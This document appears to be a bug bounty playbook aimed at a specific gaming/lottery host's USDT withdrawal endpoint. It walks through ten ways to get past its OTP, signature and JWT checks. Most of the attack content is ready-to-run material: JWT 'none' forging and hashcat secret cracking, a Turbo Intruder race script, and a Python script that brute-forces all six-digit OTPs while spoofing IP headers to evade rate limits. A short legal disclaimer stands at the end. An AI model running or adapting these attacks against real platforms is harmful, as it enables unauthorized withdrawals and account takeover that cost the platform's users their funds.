# 🎯 Live OTP Testing Playbook - Hands-On Bug Bounty Guide

**Target:** Gaming/Lottery Platform  
**Endpoint:** `POST /api/webapi/SetWithdrawalUsdt`  
**Security Layers:** JWT + Signature + OTP  
**Date:** February 13, 2026

---

## 📋 Target Analysis

### Authentication Mechanism
- **JWT Algorithm:** HS256 (HMAC SHA-256)
- **Token Location:** Authorization: Bearer header
- **Additional Security:** Request signature + timestamp

### OTP Verification Endpoint
```http
POST /api/webapi/SetWithdrawalUsdt HTTP/2
Host: imgametransit.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
Content-Type: application/json

{
  "withdrawid": 3,
  "bankid": 58,
  "usdtaddress": "TPGEVrrVCe8fDqHLSiKBxV4gWrgqaTPrzK",
  "smsCode": "458521",
  "usdtRemarkName": "Kadumb",
  "type": "mobile",
  "codeType": 7,
  "language": 0,
  "random": "68788f174d384901ac11f56d6f7575e3",
  "signature": "FBFC4D7BEBA9D45B42D0A963BA7FB9E7",
  "timestamp": 1770980964
}
```

### Success Response
```json
{
  "code": 0,
  "msg": "Succeed",
  "msgCode": 0,
  "serviceNowTime": "2026-02-13 16:39:27"
}
```

---

## 🎯 ATTACK #1: Response Manipulation

**Success Rate:** 40%  
**Difficulty:** Easy  
**Impact:** Critical - Complete OTP bypass

### Method
Intercept the server response and modify the error to success.

### Steps

1. **In Burp Suite:**
   - Proxy → Options → Intercept Server Responses
   - ☑ "Intercept responses based on the following rules"
   - Add rule: URL contains `SetWithdrawalUsdt`

2. **Send Request with Wrong OTP:**
   ```json
   "smsCode": "000000"
   ```

3. **Intercept the Response:**
   ```json
   {"code":1,"msg":"Invalid verification code","msgCode":xxx}
   ```

4. **Modify to Success:**
   ```json
   {"code":0,"msg":"Succeed","msgCode":0,"serviceNowTime":"2026-02-13 16:39:27"}
   ```

5. **Forward Modified Response**

### Testing Checklist
```
□ Test with completely wrong OTP (000000)
□ Test with empty OTP ("")
□ Test with no OTP parameter
□ Check if client validates response
□ Verify if transaction actually processes
```

### Expected Results
- ✅ **Vulnerable:** Withdrawal processes with wrong OTP
- ❌ **Not Vulnerable:** Client-side validation blocks it OR server validates again

---

## 🎯 ATTACK #2: Signature Bypass

**Success Rate:** 35%  
**Difficulty:** Easy  
**Impact:** High - Bypasses request integrity check

### Method
The `signature` parameter might not be properly validated server-side.

### Test Cases

#### 2.1 - Remove Signature Parameter
```json
{
  "smsCode": "000000",
  "random": "68788f174d384901ac11f56d6f7575e3",
  "timestamp": 1770980964
  (remove signature line entirely)
}
```

#### 2.2 - Empty Signature
```json
"signature": ""
```

#### 2.3 - Null Signature
```json
"signature": null
```

#### 2.4 - Invalid Signature
```json
"signature": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
```

#### 2.5 - Old Valid Signature (Replay)
```json
"signature": "FBFC4D7BEBA9D45B42D0A963BA7FB9E7"
(use old signature with new timestamp/random)
```

### Testing Checklist
```
□ Remove signature parameter
□ Empty string signature
□ Null signature value
□ Random/invalid signature
□ Reused old signature
□ Check response codes for each
```

### Python Exploit (If Vulnerable)
```python
import requests
import time

url = "https://imgametransit.com/api/webapi/SetWithdrawalUsdt"
headers = {
    "Authorization": "Bearer YOUR_JWT_TOKEN",
    "Content-Type": "application/json"
}

payload = {
    "withdrawid": 3,
    "bankid": 58,
    "usdtaddress": "YOUR_ADDRESS",
    "smsCode": "000000",  # Wrong OTP!
    "type": "mobile",
    "codeType": 7,
    "language": 0,
    "random": "fakefakefakefake",
    # No signature parameter!
    "timestamp": int(time.time())
}

response = requests.post(url, json=payload, headers=headers)
print(response.json())
```

---

## 🎯 ATTACK #3: OTP Parameter Manipulation

**Success Rate:** 30%  
**Difficulty:** Easy  
**Impact:** Critical

### Method
Manipulate the OTP parameter to bypass validation.

### Test Cases

#### 3.1 - Remove OTP Parameter
```json
{
  "withdrawid": 3,
  "bankid": 58,
  (completely remove "smsCode" line)
  "type": "mobile",
  ...
}
```

#### 3.2 - Empty OTP
```json
"smsCode": ""
```

#### 3.3 - Null OTP
```json
"smsCode": null
```

#### 3.4 - Boolean True
```json
"smsCode": true
```

#### 3.5 - Array Injection
```json
"smsCode": ["000000", "111111", "458521"]
```

#### 3.6 - Object Injection
```json
"smsCode": {"verified": true, "code": "000000"}
```

#### 3.7 - Special Characters
```json
"smsCode": "' OR '1'='1"
```

#### 3.8 - Unicode/Emoji
```json
"smsCode": "🔥🔥🔥🔥🔥🔥"
```

### Testing Checklist
```
□ Remove parameter completely
□ Empty string
□ Null value
□ Boolean true/false
□ Array with multiple values
□ Object with nested properties
□ SQL injection payloads
□ Unicode characters
□ Very long string (10000 chars)
```

---

## 🎯 ATTACK #4: JWT Token Manipulation

**Success Rate:** 25%  
**Difficulty:** Medium  
**Impact:** Critical - Full authentication bypass

### Method
Exploit JWT vulnerabilities (HS256 algorithm detected).

### 4.1 - None Algorithm Attack

**Step 1:** Decode current JWT at https://jwt.io

**Step 2:** Modify header:
```json
Original: {"alg":"HS256","typ":"JWT"}
Modified: {"alg":"none","typ":"JWT"}
```

**Step 3:** Base64 encode new header:
```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
```

**Step 4:** Create new token (NO signature):
```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.ORIGINAL_PAYLOAD.
```
(Notice the trailing dot with no signature)

**Step 5:** Replace Authorization header

### 4.2 - Weak Secret Brute-Force

Use `hashcat` or `john` to crack the HS256 secret:

```bash
# Save JWT to file
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." > jwt.txt

# Crack with hashcat
hashcat -m 16500 jwt.txt rockyou.txt

# Or with john
john jwt.txt --wordlist=rockyou.txt
```

Common weak secrets to try:
```
secret
password
123456
jwt-secret
signing-key
auth-key
api-secret
[app-name]-secret
```

### 4.3 - Algorithm Confusion (HS256 → RS256)

If you have access to the public key, try changing algorithm.

### 4.4 - Claim Manipulation

Modify JWT payload claims:
```json
{
  "UserId": "6980332",
  "UserName": "918076291352",
  "Amount": "999999.99",    ← Change to huge amount
  "Isvalidator": "1",        ← Try becoming admin
  "KeyCode": "48"
}
```

### Testing Checklist
```
□ None algorithm attack
□ Brute-force weak secret
□ Try common secrets manually
□ Modify UserId claim
□ Modify Amount claim
□ Add admin/privileged claims
□ Remove expiration claim
□ Change signature with guessed secret
```

---

## 🎯 ATTACK #5: Timestamp Manipulation

**Success Rate:** 20%  
**Difficulty:** Easy  
**Impact:** Medium - May enable replay attacks

### Test Cases

#### 5.1 - Old Timestamp
```json
"timestamp": 1000000000
```

#### 5.2 - Future Timestamp
```json
"timestamp": 9999999999
```

#### 5.3 - Zero Timestamp
```json
"timestamp": 0
```

#### 5.4 - Negative Timestamp
```json
"timestamp": -1
```

#### 5.5 - Remove Timestamp
```json
(remove timestamp parameter)
```

#### 5.6 - Null Timestamp
```json
"timestamp": null
```

#### 5.7 - String Timestamp
```json
"timestamp": "1770980964"
```

### Testing Checklist
```
□ Very old timestamp
□ Future timestamp
□ Zero value
□ Negative value
□ Remove parameter
□ Null value
□ String instead of number
□ Check time window tolerance
```

---

## 🎯 ATTACK #6: Replay Attack

**Success Rate:** 25%  
**Difficulty:** Easy  
**Impact:** Medium - OTP reuse

### Method
Reuse a successful OTP verification request multiple times.

### Steps

1. **Capture successful request** (with real OTP)
2. **Send to Repeater**
3. **Click Send again** (exact same request, same timestamp, same signature)
4. **Repeat 10 times**
5. **Check if all succeed**

### Advanced Replay Tests

#### 6.1 - Same Request, Different Time
```json
Original timestamp: 1770980964
Replay at: 1770980965 (1 second later)
```

#### 6.2 - Concurrent Replay
Send the same request 10 times simultaneously using Burp Repeater tabs.

#### 6.3 - Cross-Session Replay
1. Capture request in Session A
2. Logout and login again (Session B)
3. Replay the old request from Session A

### Testing Checklist
```
□ Immediate replay (within 1 second)
□ Replay after 5 minutes
□ Replay after 1 hour
□ Replay after JWT expiration
□ Concurrent replays (10 simultaneous)
□ Cross-session replay
□ Replay with new JWT but old signature
```

---

## 🎯 ATTACK #7: Race Condition

**Success Rate:** 15%  
**Difficulty:** Medium  
**Impact:** High - Multiple withdrawals with one OTP

### Method
Send multiple requests simultaneously to exploit timing vulnerabilities.

### Steps

1. **Request a NEW OTP** from website
2. **In Burp Repeater, create 10 tabs**
   - Tab 1: Real OTP `"smsCode":"YOUR_REAL_OTP"`
   - Tabs 2-10: Wrong OTP `"smsCode":"000000"`

3. **Send all tabs simultaneously:**
   - Ctrl+Click each Send button rapidly
   - Or use Burp Extension: "Turbo Intruder"

4. **Check how many succeed**

### Turbo Intruder Script
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=10,
                          requestsPerConnection=1,
                          pipeline=False)
    
    # Real OTP request
    engine.queue(target.req, gate='race1')
    
    # 9 fake OTP requests
    for i in range(9):
        fake_req = target.req.replace('458521', '000000')
        engine.queue(fake_req, gate='race1')
    
    # Release all at once
    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

### Testing Checklist
```
□ 10 concurrent requests (1 real, 9 fake)
□ 20 concurrent requests
□ 50 concurrent requests
□ Test with different timing delays
□ Check server response times
□ Check if multiple succeed
□ Monitor actual withdrawals in account
```

---

## 🎯 ATTACK #8: Parameter Pollution

**Success Rate:** 15%  
**Difficulty:** Easy  
**Impact:** Medium

### Method
Send duplicate parameters to confuse server-side validation.

### Test Cases

#### 8.1 - Multiple smsCode Parameters
```json
{
  "smsCode": "000000",
  "smsCode": "111111",
  "smsCode": "458521",
  "withdrawid": 3,
  ...
}
```

#### 8.2 - Array Format
```json
"smsCode": ["000000", "458521"]
```

#### 8.3 - Mixed Case Parameters
```json
{
  "smsCode": "000000",
  "SmSCode": "458521",
  "SMSCODE": "458521",
  ...
}
```

#### 8.4 - Unicode Variations
```json
"smsCode": "000000",    // Regular
"sms\u0043ode": "458521"  // Unicode 'C'
```

### Testing Checklist
```
□ Duplicate parameter (wrong then right)
□ Duplicate parameter (right then wrong)
□ 3+ duplicate parameters
□ Mixed case variations
□ Unicode character variations
□ Parameter in both body and URL
```

---

## 🎯 ATTACK #9: Type Confusion

**Success Rate:** 10%  
**Difficulty:** Easy  
**Impact:** Low-Medium

### Method
Change data types to bypass validation.

### Test Cases

#### 9.1 - Integer Instead of String
```json
"smsCode": 458521
```

#### 9.2 - Float
```json
"smsCode": 458521.0
```

#### 9.3 - Hexadecimal
```json
"smsCode": 0x6FD99
```

#### 9.4 - Scientific Notation
```json
"smsCode": 4.58521e5
```

#### 9.5 - Object
```json
"smsCode": {
  "code": "458521",
  "verified": true
}
```

#### 9.6 - Nested Object
```json
"smsCode": {
  "value": "000000",
  "__proto__": {"verified": true}
}
```

### Testing Checklist
```
□ Number instead of string
□ Float value
□ Hexadecimal format
□ Scientific notation
□ Object with properties
□ Nested object
□ Array of numbers
□ Boolean conversion
```

---

## 🎯 ATTACK #10: Brute-Force OTP

**Success Rate:** 5%  
**Difficulty:** Hard  
**Impact:** Critical (if successful)

### Prerequisites
- Weak or no rate limiting
- No account lockout
- No CAPTCHA after failures

### Burp Intruder Method

1. **Send request to Intruder**
2. **Set payload position:**
   ```json
   "smsCode": "§000000§"
   ```

3. **Payload Settings:**
   - Type: Numbers
   - From: 0
   - To: 999999
   - Min digits: 6
   - Max digits: 6
   - Step: 1

4. **Add Rate Limit Bypass Headers:**
   ```
   X-Forwarded-For: 1.1.§1§.1
   X-Real-IP: 1.1.§1§.1
   X-Originating-IP: 1.1.§1§.1
   X-Remote-IP: 1.1.§1§.1
   X-Client-IP: 1.1.§1§.1
   True-Client-IP: 1.1.§1§.1
   X-Host: 1.1.§1§.1
   ```

5. **Thread Settings:**
   - Threads: 10 (start slow, increase if no blocking)
   - Delay: 100ms between requests

6. **Start Attack**

7. **Grep - Match:** Filter for success responses
   ```
   "code":0
   "Succeed"
   ```

### Python Brute-Force Script
```python
import requests
import itertools
import time
from concurrent.futures import ThreadPoolExecutor

url = "https://imgametransit.com/api/webapi/SetWithdrawalUsdt"

def try_otp(otp):
    headers = {
        "Authorization": "Bearer YOUR_JWT_TOKEN",
        "Content-Type": "application/json",
        "X-Forwarded-For": f"1.1.{otp[:3]}.1"  # IP rotation
    }
    
    payload = {
        "withdrawid": 3,
        "bankid": 58,
        "usdtaddress": "YOUR_ADDRESS",
        "smsCode": str(otp).zfill(6),
        "type": "mobile",
        "codeType": 7,
        "language": 0,
        "random": "68788f174d384901ac11f56d6f7575e3",
        "signature": "FBFC4D7BEBA9D45B42D0A963BA7FB9E7",
        "timestamp": int(time.time())
    }
    
    try:
        response = requests.post(url, json=payload, headers=headers, timeout=5)
        data = response.json()
        
        if data.get('code') == 0:
            print(f"[+] SUCCESS! OTP: {str(otp).zfill(6)}")
            print(f"[+] Response: {data}")
            return True
        elif data.get('msgCode') == 429:  # Rate limit
            print(f"[-] Rate limited at OTP: {str(otp).zfill(6)}")
            time.sleep(60)  # Wait 1 minute
        else:
            print(f"[*] Testing OTP: {str(otp).zfill(6)} - Failed")
    except Exception as e:
        print(f"[!] Error with OTP {str(otp).zfill(6)}: {e}")
    
    time.sleep(0.1)  # 100ms delay
    return False

# Test OTP range
with ThreadPoolExecutor(max_workers=5) as executor:
    for otp in range(0, 1000000):
        if try_otp(otp):
            break
```

### Testing Checklist
```
□ Check rate limiting (send 100 requests)
□ Test IP rotation effectiveness
□ Monitor for account lockout
□ Check CAPTCHA triggers
□ Test sequential vs random OTPs
□ Measure requests per second limit
□ Check if OTP expires during brute-force
□ Monitor actual API behavior
```

---

## 📊 MASTER TESTING CHECKLIST

Track your progress through all attacks:

```
ATTACK STATUS CHECKLIST:

□ #1  Response Manipulation        [ Not Tested | Vulnerable | Not Vulnerable ]
□ #2  Signature Bypass              [ Not Tested | Vulnerable | Not Vulnerable ]
□ #3  OTP Parameter Manipulation    [ Not Tested | Vulnerable | Not Vulnerable ]
□ #4  JWT Token Manipulation        [ Not Tested | Vulnerable | Not Vulnerable ]
□ #5  Timestamp Manipulation        [ Not Tested | Vulnerable | Not Vulnerable ]
□ #6  Replay Attack                 [ Not Tested | Vulnerable | Not Vulnerable ]
□ #7  Race Condition                [ Not Tested | Vulnerable | Not Vulnerable ]
□ #8  Parameter Pollution           [ Not Tested | Vulnerable | Not Vulnerable ]
□ #9  Type Confusion                [ Not Tested | Vulnerable | Not Vulnerable ]
□ #10 Brute-Force OTP               [ Not Tested | Vulnerable | Not Vulnerable ]

SEVERITY ASSESSMENT:
□ Critical (CVSS 9.0-10.0)  - Full bypass without user interaction
□ High (CVSS 7.0-8.9)       - Bypass with conditions/user interaction
□ Medium (CVSS 4.0-6.9)     - Partial bypass or information disclosure
□ Low (CVSS 0.1-3.9)        - Minor information leak

IMPACT NOTES:
___________________________________________________________________________
___________________________________________________________________________
___________________________________________________________________________
```

---

## 🎯 Testing Priority Order

Test in this order for maximum efficiency:

**Phase 1 - Quick Wins (10 minutes):**
1. Response Manipulation
2. Signature Bypass (remove)
3. OTP Parameter Removal

**Phase 2 - Medium Effort (30 minutes):**
4. JWT None Algorithm
5. Timestamp Manipulation
6. Replay Attack

**Phase 3 - Advanced (60 minutes):**
7. Race Condition
8. Parameter Pollution
9. Type Confusion

**Phase 4 - Last Resort (hours):**
10. Brute-Force

---

## 📝 Documentation Template

### Vulnerability Report Template

```markdown
# OTP Bypass Vulnerability Report

## Summary
[Brief description of the vulnerability]

## Vulnerability Details
- **Endpoint:** POST /api/webapi/SetWithdrawalUsdt
- **Attack Method:** [e.g., Response Manipulation]
- **Severity:** Critical
- **CVSS Score:** 9.5

## Steps to Reproduce
1. [Step 1]
2. [Step 2]
3. [Step 3]

## Proof of Concept
```http
[Paste request/response]
```

## Impact
- Complete OTP bypass
- Unauthorized withdrawals
- Account takeover possible

## Recommended Fix
[Your recommendations]

## Timeline
- Discovered: 2026-02-13
- Reported: [Date]
- Fixed: [Date]
```

---

## 🔧 Tools Required

- ✅ Burp Suite Community/Pro
- ✅ Browser (Firefox/Chrome)
- ✅ Python 3.x
- ✅ requests library
- ✅ jwt.io (for JWT decoding)
- ⭕ Hashcat (optional, for JWT cracking)
- ⭕ Turbo Intruder (optional, for race conditions)

---

## ⚠️ Legal Disclaimer

**IMPORTANT:** Only test on systems you own or have explicit written permission to test!

This playbook is for:
- ✅ Your own demo/test applications
- ✅ Authorized bug bounty programs
- ✅ Client engagements with signed agreements
- ✅ Educational lab environments

**DO NOT use on:**
- ❌ Production systems without permission
- ❌ Any system you don't own
- ❌ Systems outside bug bounty scope

**Unauthorized testing is illegal and can result in criminal charges!**

---

## 📚 Additional Resources

- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [HackerOne Reports](https://hackerone.com/hacktivity)
- [JWT.io](https://jwt.io/)
- [Burp Suite Documentation](https://portswigger.net/burp/documentation)

---

## 🏆 Success Criteria

A vulnerability is confirmed when:
- ✅ You can bypass OTP with wrong/no code
- ✅ Transaction actually processes (check account)
- ✅ You can reproduce it consistently
- ✅ Impact is clearly demonstrated

---

## 📞 Next Steps After Finding Vulnerability

1. **Document Everything:**
   - Screenshots
   - Request/Response
   - Steps to reproduce

2. **Assess Impact:**
   - Can you withdraw funds?
   - Can you access other accounts?
   - What's the worst-case scenario?

3. **Write Professional Report:**
   - Use template above
   - Include POC
   - Suggest fixes

4. **Report Responsibly:**
   - Don't exploit further
   - Report to bug bounty program
   - Follow disclosure timeline

---

**Created:** 2026-02-13  
**Last Updated:** 2026-02-13  
**Status:** Active Testing  
**Target:** Demo Gaming Platform  
**Tester:** Bug Bounty Hunter

---

*Good luck with your testing! Remember: ethical hacking only!* 🛡️
